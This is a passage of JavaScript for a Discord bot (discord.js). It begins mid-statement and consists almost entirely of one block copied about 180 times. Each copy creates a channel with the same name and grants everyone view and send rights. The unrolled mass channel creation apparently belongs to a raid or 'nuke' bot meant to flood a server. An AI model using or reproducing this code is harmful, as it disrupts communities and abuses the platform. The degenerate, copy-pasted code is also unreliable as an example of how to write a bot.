          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

